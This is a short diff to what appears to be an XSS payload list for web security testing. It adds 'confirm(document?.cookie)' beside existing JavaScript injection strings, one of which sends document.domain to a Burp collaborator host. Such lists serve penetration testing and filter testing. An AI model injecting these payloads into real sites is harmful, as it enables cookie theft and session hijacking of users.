@@ -17,3 +17,4 @@ alert/**/(1)//
 ,alert(0),
 ,document.location='javascript:document.domain',
 ,window.location='http:'%2bdocument.domain%2b'.my-burp-domain',
+confirm(document?.cookie)
